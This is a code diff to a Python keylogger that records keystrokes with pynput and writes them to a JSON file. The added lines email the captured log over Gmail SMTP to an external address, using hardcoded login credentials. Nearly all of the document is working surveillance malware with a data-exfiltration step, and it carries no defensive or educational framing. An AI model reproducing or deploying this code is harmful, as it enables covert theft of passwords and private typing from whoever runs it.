@@ -1,14 +1,17 @@
 from pynput import keyboard
 import json
 from threading import Timer
+import smtplib
+from email.message import EmailMessage
 
 key_list = []
 x = False  # Value to if held
+json_file_path = 'logs.json'
 
 
 # Trocar para C:\Windows\Temp\logs.json
 def update_json_file(key_list):
-    with open('logs.json', '+wb') as key_log:
+    with open(json_file_path, '+wb') as key_log:
         key_list_bytes = json.dumps(key_list).encode()
         key_log.write(key_list_bytes)
 
@@ -39,3 +42,19 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     Timer(5, listener.stop).start()
     listener.join()
     print("[-] Keylogger finalizado!")
+
+msg = EmailMessage()
+msg['Subject'] = 'keylogger'
+msg['From'] = 'MC Poze'
+msg['To'] = 'd.lima@aln.senaicimatec.edu.br'
+
+with open(json_file_path) as myfile:
+    data = myfile.read()
+    msg.set_content(data)
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.login("mcpozebaiano", "mcpozedorodo")
+    server.send_message(msg)
+
+print("Email sent!")
